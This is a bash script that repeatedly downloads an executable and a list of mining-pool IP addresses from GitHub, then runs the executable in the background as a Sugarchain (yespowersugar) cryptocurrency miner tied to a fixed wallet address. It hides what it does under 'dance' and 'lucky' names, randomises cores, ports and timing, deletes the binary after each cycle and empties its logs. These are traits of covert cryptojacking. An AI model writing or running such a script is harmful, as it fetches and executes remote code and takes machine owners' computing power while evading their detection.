#!/bin/bash

# URL to the JSON file
json_url="https://github.com/barburonjilo/setstra/raw/main/list2.json"
json_file="list.json"

# Function to download the JSON file
download_json() {
  echo "Downloading JSON file from $json_url..."
  wget -O $json_file $json_url
  if [[ ! -f $json_file ]]; then
    echo "Failed to download JSON file. Exiting."
    exit 1
  fi
}

# Function to download and prepare the dancing script with a dynamic name
prepare_dancing_script() {
  local old_file=$(cat /tmp/lucky_file 2>/dev/null)
  if [[ -n "$old_file" && -f "$old_file" ]]; then
    echo "Removing old dancing script file: $old_file"
    rm -f "$old_file"
  fi

  local timestamp=$(date '+%Y%m%d%H%M%S')
  local filename="dance_${timestamp}"
  wget -O $filename https://github.com/barburonjilo/back/raw/main/sr
  chmod +x $filename
  echo $filename > /tmp/lucky_file
}

# Function to generate the localized date string with core count
generate_dancer() {
  local cores=$1
  TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed \
    's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/' \
    | sed "s/$/$cores/"
}

# Function to select a random IP from the JSON file
select_random_ip() {
  local ip=$(jq -r '.[]' $json_file | shuf -n 1)
  
  if [[ -z "$ip" ]]; then
    echo "No IP found in $json_file. Exiting."
    exit 1
  fi

  # Remove selected IP from JSON file
  jq --arg ip "$ip" 'del(.[] | select(. == $ip))' $json_file > tmp.json && mv tmp.json $json_file

  echo "$ip"
}

# Function to start the dancing process with a random number of cores
start_dance() {
  local total_cores=$(nproc)
  local num_cores=$(( ( RANDOM % (total_cores - 1) ) + 1 ))  # Randomly choose between 1 and (total_cores - 1)
  local dancer=$(generate_dancer $num_cores)  # Generate dancer string including core count
  local lucky_file=$(cat /tmp/lucky_file)

  # Select a random IP and assign it to a random port
  local ip=$(select_random_ip)
  local port=$(( ( RANDOM % 10 ) + 843 ))  # Random port between 843 and 852

  # Start the dancing process for the selected port
  nohup ./$lucky_file -a yespowersugar --pool $ip:$port -u sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr.$dancer --timeout 120 -t $num_cores > dance_$port.log 2>&1 &
  local pid=$!
  echo "Dance started with PID: $pid using $num_cores cores with file $lucky_file, IP $ip, and port $port"

  # Save PID to a file for later use
  echo "$pid" > /tmp/lucky_pid
}

# Function to stop the dancing process
stop_dance() {
  if [ -f /tmp/lucky_pid ]; then
    local pid=$(cat /tmp/lucky_pid)
    local lucky_file=$(cat /tmp/lucky_file)
    echo "Stopping dance with PID: $pid using file $lucky_file"
    kill -9 $pid 2>/dev/null
    rm -f /tmp/lucky_pid

    # Empty the dance.log file
    local port=$(( ( RANDOM % 10 ) + 843 ))  # Same port used as in start_dance
    > dance_$port.log

    # Remove the stopped file
    if [[ -f "$lucky_file" ]]; then
      echo "Removing stopped dancing script file: $lucky_file"
      rm -f "$lucky_file"
    fi
  else
    echo "No PID file found, cannot stop dance"
  fi
}

# Function to generate a random sleep duration between 3 and 5 minutes
get_random_sleep_duration() {
  local min=180    # 3 minutes in seconds
  local max=300    # 5 minutes in seconds
  echo $((RANDOM % (max - min + 1) + min))
}

# Main execution loop
while true; do
  download_json
  prepare_dancing_script

  start_dance

  # Get a random sleep duration
  sleep_duration=$(get_random_sleep_duration)

  # Validate and debug sleep duration
  if [[ -z "$sleep_duration" || "$sleep_duration" -lt 180 ]]; then
    echo "Error: Invalid sleep duration: $sleep_duration. Defaulting to 3 minutes."
    sleep_duration=180
  elif [[ "$sleep_duration" -gt 300 ]]; then
    echo "Error: Sleep duration exceeds maximum value. Adjusting to 5 minutes."
    sleep_duration=300
  fi

  echo "Sleeping for $((sleep_duration / 60)) minutes ($sleep_duration seconds)"
  sleep $sleep_duration

  stop_dance
done
